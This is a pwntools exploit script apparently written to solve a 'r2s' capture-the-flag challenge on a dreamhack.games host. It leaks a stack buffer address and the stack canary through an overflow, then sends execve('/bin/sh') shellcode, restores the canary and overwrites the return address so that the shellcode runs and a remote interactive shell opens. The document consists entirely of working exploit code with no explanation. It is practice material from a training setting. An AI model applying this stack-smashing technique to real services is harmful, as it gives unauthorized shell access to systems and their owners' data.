#!/usr/bin/python3

from pwn import *


context.binary = exe = ELF('./r2s',checksec = False)

# ret = 0x00000000000006ee

r= remote('host2.dreamhack.games',22392)
# r = process(exe.path)
r.recvuntil(b'Address of the buf: ')
buf = r.recv(14).decode()
log.info("Buf: "+ buf)

payload = b'A'*0x59
input()
r.sendafter(b'Input: ',payload)
r.recv(0x68)
canary = u64(b'\00' + r.recv(7))
log.info("Canary: "+hex(canary))
# 0xc7e354659a7fc800

shellcode = asm(
	'''
	mov rbx, 29400045130965551
	push rbx
	mov rdi,rsp
	xor rsi,rsi
	xor rax,rax
	xor rdx,rdx
	mov rax, 0x3b

	syscall


	'''
	)

payload = b'A'*20 + shellcode
payload = payload.ljust(0x58,b'A')
payload += p64(int(hex(canary),16)) + b'A'*8
payload += p64(int(buf,16) + 20)
r.sendlineafter(b'Input: ',payload)

# r.sendafter(b'Input: ',b'1111111')

r.interactive()